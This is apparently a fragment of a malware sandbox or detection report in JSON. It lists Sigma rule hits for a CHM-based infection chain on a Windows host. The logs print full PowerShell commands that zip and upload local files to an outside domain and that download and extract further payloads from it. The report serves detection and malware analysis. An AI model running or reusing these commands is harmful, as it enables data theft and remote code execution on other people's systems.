                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C69-6553-4A06-000000004800}; ProcessId=6776; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5B-6553-3206-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7404; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=powershell  -ep bypass -command \"Add-Type -AssemblyName System.IO.Compression.FileSystem;$l=\u0027https://niscarea.com\u0027;$f=\u0027C:\\Users\\Public\\Libraries\\tsklt.txt\u0027;$r=[DateTime]::Now.ToString(\u0027MM-dd HH-mm-ss\u0027);$c= [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$z=$f+\u0027.zip\u0027;$e=$f+\u0027.enc\u0027;Remove-Item $z -Force;Remove-Item $e -Force;$t=$f.Substring($f.LastIndexOf(\u0027\\\u0027)+1);$h=[System.IO.Compression.ZipFile]::Open($z,\u0027Create\u0027);[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($h,$f,$t);$h.Dispose();$b=Get-Content $z -Encoding Byte -Raw;[Convert]::ToBase64String($b)|Out-File $e -Encoding ascii;Remove-Item $z -Force;Remove-Item $f -Force;$u=$l+\u0027/in.php?cn=\u0027+$c+\u0027\u0026fn=\u0027+$r;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$w.UploadFile($u,$e);Remove-Item $e -Force;\"; EventID=1; LogonGuid=C784477D-A600-6537-A5CC-030000000000; LogonId=248997; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978345; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C6B-6553-4C06-000000004800}; ProcessId=7372; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5D-6553-3B06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7752; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=powershell  -ep bypass -command \"Add-Type -AssemblyName System.IO.Compression.FileSystem;$l=\u0027https://niscarea.com\u0027;$f=\u0027C:\\Users\\Public\\Libraries\\tsklt.txt\u0027;$r=[DateTime]::Now.ToString(\u0027MM-dd HH-mm-ss\u0027);$c= [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$z=$f+\u0027.zip\u0027;$e=$f+\u0027.enc\u0027;Remove-Item $z -Force;Remove-Item $e -Force;$t=$f.Substring($f.LastIndexOf(\u0027\\\u0027)+1);$h=[System.IO.Compression.ZipFile]::Open($z,\u0027Create\u0027);[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($h,$f,$t);$h.Dispose();$b=Get-Content $z -Encoding Byte -Raw;[Convert]::ToBase64String($b)|Out-File $e -Encoding ascii;Remove-Item $z -Force;Remove-Item $f -Force;$u=$l+\u0027/in.php?cn=\u0027+$c+\u0027\u0026fn=\u0027+$r;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$w.UploadFile($u,$e);Remove-Item $e -Force;\"; EventID=1; LogonGuid=C784477D-A600-6537-CFCC-030000000000; LogonId=249039; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978347; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C72-6553-4E06-000000004800}; ProcessId=6832; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5B-6553-3206-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7404; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=powershell  -ep bypass -command \"Add-Type -AssemblyName System.IO.Compression.FileSystem;$l=\u0027https://niscarea.com\u0027;$f=\u0027C:\\Users\\Public\\Libraries\\desk.txt\u0027;$r=[DateTime]::Now.ToString(\u0027MM-dd HH-mm-ss\u0027);$c= [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$z=$f+\u0027.zip\u0027;$e=$f+\u0027.enc\u0027;Remove-Item $z -Force;Remove-Item $e -Force;$t=$f.Substring($f.LastIndexOf(\u0027\\\u0027)+1);$h=[System.IO.Compression.ZipFile]::Open($z,\u0027Create\u0027);[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($h,$f,$t);$h.Dispose();$b=Get-Content $z -Encoding Byte -Raw;[Convert]::ToBase64String($b)|Out-File $e -Encoding ascii;Remove-Item $z -Force;Remove-Item $f -Force;$u=$l+\u0027/in.php?cn=\u0027+$c+\u0027\u0026fn=\u0027+$r;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$w.UploadFile($u,$e);Remove-Item $e -Force;\"; EventID=1; LogonGuid=C784477D-A600-6537-A5CC-030000000000; LogonId=248997; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978354; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "0c6e3c35fbd166dc96fbf3faf4f052230a9cc9db642ee3bee40f5c94d5938d03",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious PowerShell Download",
                                                                       "rule_description":  "Detects suspicious PowerShell download command",
                                                                       "rule_author":  "Florian Roth (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=400; Data=[Available None \tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.17134.858\n\tHostId=0e921199-e14c-4d1a-963d-d14d82e1d64d\n\tHostApplication=powershell -ep bypass -command $l=\u0027https://niscarea.com\u0027;$c=[Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$u=$l+\u0027/?cn=\u0027+$c;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$r=$w.DownloadString($u)\n\tEngineVersion=5.1.17134.858\n\tRunspaceId=5f583abc-9639-4dad-a5f8-ae4944b4bc09\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=]}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=400; Data=[Available None \tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.17134.858\n\tHostId=8ebffbc3-9372-48c9-a8b1-4594dc406264\n\tHostApplication=powershell -ep bypass -command $l=\u0027https://niscarea.com\u0027;$c=[Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$u=$l+\u0027/?cn=\u0027+$c;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$r=$w.DownloadString($u)\n\tEngineVersion=5.1.17134.858\n\tRunspaceId=1f1f4491-0f82-4542-9385-d157448fdf99\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=]}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=400; Data=[Available None \tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.17134.858\n\tHostId=2e243d51-1346-4bed-8f80-4644ae214998\n\tHostApplication=powershell -ep bypass -command Add-Type -AssemblyName System.IO.Compression.FileSystem;$l=\u0027https://niscarea.com\u0027;$f=\u0027C:\\Users\\Public\\Libraries\\alo293n20so.zip\u0027;$c=[Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$u=$l+\u0027/out.php?cn=\u0027+$c;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$r=$w.DownloadString($u);if ($r.Length -gt 32){Remove-Item $f -Force;$b=[Convert]::FromBase64String($r);[System.IO.File]::WriteAllBytes($f,$b);$h=[System.IO.Compression.ZipFile]::OpenRead($f);foreach ($e in $h.Entries){\t[System.IO.Compression.ZipFileExtensions]::ExtractToFile($e,$e.FullName,$true);}$h.Dispose();Remove-Item $f -Force;}\n\tEngineVersion=5.1.17134.858\n\tRunspaceId=ce082c88-bc7d-4fe2-92df-05b742475846\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=]}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=400; Data=[Available None \tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.17134.858\n\tHostId=9afd58a0-92a4-404a-8654-04c341b8cbd5\n\tHostApplication=powershell -ep bypass -command Add-Type -AssemblyName System.IO.Compression.FileSystem;$l=\u0027https://niscarea.com\u0027;$f=\u0027C:\\Users\\Public\\Libraries\\alo293n20so.zip\u0027;$c=[Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$u=$l+\u0027/out.php?cn=\u0027+$c;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$r=$w.DownloadString($u);if ($r.Length -gt 32){Remove-Item $f -Force;$b=[Convert]::FromBase64String($r);[System.IO.File]::WriteAllBytes($f,$b);$h=[System.IO.Compression.ZipFile]::OpenRead($f);foreach ($e in $h.Entries){\t[System.IO.Compression.ZipFileExtensions]::ExtractToFile($e,$e.FullName,$true);}$h.Dispose();Remove-Item $f -Force;}\n\tEngineVersion=5.1.17134.858\n\tRunspaceId=b142a8d9-47d8-4e3a-a2c1-e19c1085be8e\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=]}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "1429a6819ff25aad68fb09601fb0b63c4be24919adfd25c4ad925ef8d47d8f22",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "WmiPrvSE Spawned A Process",
                                                                       "rule_description":  "Detects WmiPrvSE spawning a process",
                                                                       "rule_author":  "Roberto Rodriguez @Cyb3rWard0g",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C5B-6553-3206-000000004800}; ProcessId=7404; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-A5FF-6537-5900-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=3396; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; EventID=1; LogonGuid=C784477D-A600-6537-A5CC-030000000000; LogonId=248997; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1699978331; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C5D-6553-3B06-000000004800}; ProcessId=7752; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-A5FF-6537-5900-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=3396; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; EventID=1; LogonGuid=C784477D-A600-6537-CFCC-030000000000; LogonId=249039; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1699978333; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "2020feadc9b3cf47558c219948361d9d3eb5347af91135f21bf711f6032bc817",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Potential Dropper Script Execution Via WScript/CScript",
                                                                       "rule_description":  "Detects wscript/cscript executions of scripts located in user directories",
                                                                       "rule_author":  "Margaritis Dimitrios (idea), Florian Roth (Nextron Systems), oscd.community, Nasreddine Bencherchali (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{CommandLine=C:\\Windows\\System32\\WScript.exe \"C:\\Users\\Public\\Libraries\\emlmanager.vbs\"; Image=C:\\Windows\\System32\\WScript.exe; EventID=1}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "8b884f70bb47a8e06faf8f548fcfef77fe3802d22c310c4cdfa01f35cb030bac",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript",
                                                                       "rule_description":  "Detects script file execution (.js, .jse, .vba, .vbe, .vbs, .wsf) by Wscript/Cscript",
                                                                       "rule_author":  "Michael Haag",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C5A-6553-3006-000000004800}; ProcessId=7312; Product=Microsoft \\xae Windows Script Host; Description=Microsoft \\xae Console Based Script Host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5A-6553-2E06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=956185CAF895737F30E8EE24DEFCE8E6,SHA256=0E54A952CD1C5CECBAC0B00155F6094939484C47CE130AAC3441058DA60BAFA5,IMPHASH=AC41732425A8C1DC99B4B3CE314D9654; OriginalFileName=cscript.exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=5.812.10240.16384; ParentProcessId=7256; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=cscript  C:\\Users\\Public\\Libraries\\emlmanager.vbs; EventID=1; LogonGuid=C784477D-A600-6537-A5CC-030000000000; LogonId=248997; Image=C:\\Windows\\System32\\cscript.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c start /min cscript C:\\Users\\Public\\Libraries\\emlmanager.vbs; UtcTime=1699978330; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "b0b20b09dd98169c1af4e8643b69d1bbe0cb12c553056b15d64e45d7726ff1b4",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "HH.EXE Execution",
                                                                       "rule_description":  "Detects the usage of \"hh.exe\" to execute \".chm\" files.",
                                                                       "rule_author":  "E.M. Anhaus (originally from Atomic Blue Detections, Dan Beavin), oscd.community",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C4F-6553-2B06-000000004800}; ProcessId=5420; Product=HTML Help; Description=Microsoft\\xae HTML Help Executable; Company=Microsoft Corporation; ParentProcessGuid={C784477D-A601-6537-6B00-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=A50C9DF7603E2F1AEA6B54053794A326,SHA256=308B97761A8B59409EEBA0ED4CE1C24F6B3C81801358296F19E607348C5AA8CB,IMPHASH=D3D9C3E81A404E7F5C5302429636F04C; OriginalFileName=HH.exe; ParentImage=C:\\Windows\\explorer.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4988; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=\"C:\\Windows\\hh.exe\" C:\\Users\\george\\Desktop\\[HF].chm; EventID=1; LogonGuid=C784477D-A600-6537-A5CC-030000000000; LogonId=248997; Image=C:\\Windows\\hh.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\Explorer.EXE; UtcTime=1699978319; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C51-6553-2D06-000000004800}; ProcessId=7176; Product=HTML Help; Description=Microsoft\\xae HTML Help Executable; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C4F-6553-2B06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=A50C9DF7603E2F1AEA6B54053794A326,SHA256=308B97761A8B59409EEBA0ED4CE1C24F6B3C81801358296F19E607348C5AA8CB,IMPHASH=D3D9C3E81A404E7F5C5302429636F04C; OriginalFileName=HH.exe; ParentImage=C:\\Windows\\hh.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=5420; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=\"C:\\Windows\\hh.exe\" -decompile C:\\Users\\Public\\Libraries C:\\Users\\george\\Desktop\\[HF].chm; EventID=1; LogonGuid=C784477D-A600-6537-A5CC-030000000000; LogonId=248997; Image=C:\\Windows\\hh.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\hh.exe\" C:\\Users\\george\\Desktop\\[HF].chm; UtcTime=1699978321; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "dac677b84d14788387f1c92fd6733396974f070639fca6be1bbf50df44b426cf",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "PowerShell Web Download",
                                                                       "rule_description":  "Detects suspicious ways to download files or content using PowerShell",
                                                                       "rule_author":  "Florian Roth (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C8F-6553-5806-000000004800}; ProcessId=6088; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5B-6553-3206-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7404; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=powershell  -ep bypass -command \"$l=\u0027https://niscarea.com\u0027;$c=[Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$u=$l+\u0027/?cn=\u0027+$c;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$r=$w.DownloadString($u)\"; EventID=1; LogonGuid=C784477D-A600-6537-A5CC-030000000000; LogonId=248997; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978383; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C92-6553-5A06-000000004800}; ProcessId=6296; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5D-6553-3B06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7752; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=powershell  -ep bypass -command \"$l=\u0027https://niscarea.com\u0027;$c=[Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$u=$l+\u0027/?cn=\u0027+$c;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$r=$w.DownloadString($u)\"; EventID=1; LogonGuid=C784477D-A600-6537-CFCC-030000000000; LogonId=249039; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978386; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C9F-6553-5C06-000000004800}; ProcessId=7284; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5B-6553-3206-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7404; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=powershell  -ep bypass -command \"Add-Type -AssemblyName System.IO.Compression.FileSystem;$l=\u0027https://niscarea.com\u0027;$f=\u0027C:\\Users\\Public\\Libraries\\alo293n20so.zip\u0027;$c=[Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$u=$l+\u0027/out.php?cn=\u0027+$c;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$r=$w.DownloadString($u);if ($r.Length -gt 32){Remove-Item $f -Force;$b=[Convert]::FromBase64String($r);[System.IO.File]::WriteAllBytes($f,$b);$h=[System.IO.Compression.ZipFile]::OpenRead($f);foreach ($e in $h.Entries){\t[System.IO.Compression.ZipFileExtensions]::ExtractToFile($e,$e.FullName,$true);}$h.Dispose();Remove-Item $f -Force;}\"; EventID=1; LogonGuid=C784477D-A600-6537-A5CC-030000000000; LogonId=248997; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978399; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9CA4-6553-5D06-000000004800}; ProcessId=6544; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5D-6553-3B06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7752; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=powershell  -ep bypass -command \"Add-Type -AssemblyName System.IO.Compression.FileSystem;$l=\u0027https://niscarea.com\u0027;$f=\u0027C:\\Users\\Public\\Libraries\\alo293n20so.zip\u0027;$c=[Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$u=$l+\u0027/out.php?cn=\u0027+$c;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$r=$w.DownloadString($u);if ($r.Length -gt 32){Remove-Item $f -Force;$b=[Convert]::FromBase64String($r);[System.IO.File]::WriteAllBytes($f,$b);$h=[System.IO.Compression.ZipFile]::OpenRead($f);foreach ($e in $h.Entries){\t[System.IO.Compression.ZipFileExtensions]::ExtractToFile($e,$e.FullName,$true);}$h.Dispose();Remove-Item $f -Force;}\"; EventID=1; LogonGuid=C784477D-A600-6537-CFCC-030000000000; LogonId=249039; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978404; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "f09d5248ed8fc1a93251158bfda71f8144ccaf37fa922416ccd897498bff7c55",
                                                                       "rule_source":  "SOC Prime Threat Detection Marketplace",
                                                                       "rule_title":  "Suspicious Process Creation",
                                                                       "rule_description":  "Detects suspicious process starts on Windows systems based on keywords",
                                                                       "rule_author":  "Florian Roth",
                                                                       "match_context":  [
                                                                                             {
